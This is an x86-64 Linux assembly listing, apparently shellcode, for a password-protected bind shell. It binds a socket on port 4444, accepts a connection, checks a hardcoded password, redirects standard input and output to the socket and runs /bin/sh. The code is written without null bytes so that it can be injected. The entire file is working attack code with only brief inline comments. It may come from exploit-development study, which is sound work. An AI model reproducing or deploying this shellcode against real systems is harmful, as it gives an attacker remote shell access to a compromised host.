global _start

section .text

_start:

	; Syscall socket()
	xor rax, rax
	add al, 0x29   ; Syscall Socket (41)
	xor rdi, rdi
	add rdi, 0x2    ; 2 - AF_INET
	xor rsi, rsi
	inc rsi         ; 1 - SOCK_STREAM
	xor rdx, rdx    ; 0 - INADDR_ANY
	syscall

	mov rdi, rax	; Get Socket handle into rdi
    
	; Syscall bind()
	xor rax, rax

	push rax
	push rax		; 0.0.0.0
	push word 0x5C11	; Port 4444
	push word 0x02		; AF_INET = 2
	mov rsi, rsp		; sockaddr structure passed to rsi
	add rdx, 0x10		; address len (16)
	add al, 0x31		; Syscall Bind (49)
	syscall
    
	; Syscall listen()
	xor rax, rax
	add al, 0x32		; Syscall Listen (50)
	xor rsi, rsi		
	inc rsi			; rsi = backlog = 1
	syscall
    
	; Syscall accept()
	xor rax, rax
	add al, 0x2b		; Syscall Accept (43)
	xor rsi, rsi		; rsi = 0
	mov rdx, rsi		; rdx = 0
	syscall
	mov r15, rax		; Preserve Socket handle for later

	; Syscall Read() - Password validation
	mov rax, rsi			; Syscall Read (0) ; rsi is already 0 from last xor rsi, rsi
	mov rdi, r15			; rdi = Socket handle
	sub rsp, 0x1e			; Stack buffer - Space allocation
	mov rsi, rsp			; Buf addr to rsi
	mov dl, 0x1e			; nr of Bytes to read
	syscall

	mov rax, 0x64726f7773736170	; hardcoded password in little endian "drowssap"  
	mov rdi, rsi			; password
	scasq				; compare rax with rdi
	jne exit			; if is password incorrect jump to exit


	; Syscall dup2()
	xor rsi, rsi
	add rsi, 0x02		; rsi = counter with fd
	mov rdi, r15		; rdi = Socket Handle

	loop:
		xor rax, rax
		add al, 0x21	; Syscall Dup2 (33)
		syscall
		dec rsi		; decrement fd (stdin, stdout, stderr)
		jns loop

  
	; Syscall execve()
	xor rax, rax
	add al, 0x3b			; Syscall Execve (59)
	cdq                    
	mov rbx, 0x0168732f6e69622f	; String "hs/nib/" padded with 01 to avoid null byte

	rol rbx, 0x08			; Rotates Left 1 byte: 01 to the least significant byte
	dec rbx				; Dec rbx by 1 (01 becomes 00)
	ror rbx, 0x08			; Rotate Right 1 byte: rbx becomes 0x0068732f6e69622f
					; without using any null byte

	push rbx
	mov rdi, rsp			; rsi -> rdi -> path = /bin/sh,0x0  
	push rdx			; rdx = 0
	push rdi
	mov rsi, rsp
	syscall
    
	exit:
	; Syscall close()
	xor rax, rax
	add al, 0x03		; Syscall Close (3)
	syscall

	; Syscall exit()
	xor rax, rax
	add al, 0x3C		; Syscall Exit(60)
	syscall
